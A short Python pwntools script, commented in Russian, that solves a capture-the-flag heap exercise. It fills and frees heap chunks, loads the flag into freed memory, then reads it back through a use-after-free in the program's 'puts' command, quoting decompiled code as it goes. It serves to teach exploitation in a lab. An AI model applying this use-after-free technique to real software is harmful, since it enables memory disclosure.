from pwn import * # подключение библиотеки pwntools

p = process ("/challenge/toddlerheap_level1.1")
# запускаем процесс с исполняемым файлом

for i in range (15):#цикл для заполнений блоков в куче
    #максимальное колличество  16 блоков, из Ghidra:
    #    if (0xf < uVar2) {
    #                /* WARNING: Subroutine does not return */
    #        __assert_fail("allocation_index < 16","/mnt/pwnshop/source.c",0x4b,"main");
    #      }
    print (p.recvuntil(b":"))
    #доходим до конца строки, которая заканчивается на двоеточие
    p.sendline(b"malloc")
    #создаем блок в куче, отправляя команду malloc
    print(p.recvuntil(b":"))
    p.sendline(str(i).encode())
    #отправляем индекс созданного блока 
    print (p.recvuntil(b":"))
    p.sendline(b"1024")
    #отправляем размер блока в 1024 байта максимум по условию из Ghidra:
    #          if (0xf < uVar2) {
    #                /* WARNING: Subroutine does not return */
    #        __assert_fail("allocation_index < 16","/mnt/pwnshop/source.c",0x4b,"main");
    #      }
    


for i in range (15):#цикл для освобождения блоков в куче
    print (p.recvuntil(b":"))#доходим до конца строки, которая заканчивается на двоеточие
    p.sendline(b"free")#отправляем команду free для освобождения блока в куче
    print(p.recvuntil(b":"))#доходим до конца строки, которая заканчивается на двоеточие
    p.sendline(str(i).encode())#отправляем индекс освобождаемого блока в куче

print (p.recvuntil(b":"))
p.sendline(b"read_flag")#записываем флаг в кучу 

for i in range (16):
    print (p.recvuntil(b":"))  
    p.sendline(b"puts")#отправляем команду puts для вывода содержимого блока в куче
    print(p.recvuntil(b":"))
    p.sendline(str(i).encode())#обращаемся к каждому блоку в куче, которые мы заранее создали и освободили
    #так как в функции puts  не проверки на очищенные адреса кучи, то мы можем вывести флаг, который записали в кучу с помощью команды read_flag
    # iVar1 = strcmp(local_98,"puts");
    #  if (iVar1 != 0) break;
    #  printf("Index: ");
    #  __isoc99_scanf("%127s",local_98);
    #  puts("");
    #  uVar2 = atoi(local_98);
    #  if (0xf < uVar2) {
    #                /* WARNING: Subroutine does not return */
    #    __assert_fail("allocation_index < 16","/mnt/pwnshop/source.c",0x6c,"main");
    #  }
    #  printf("Data: ");
    #  puts(*(char **)(alloc_struct + ((ulong)uVar2 + 0x20) * 8));
    #}

p.close()
#Ну и конечно завершаем процесс уже победителями =)
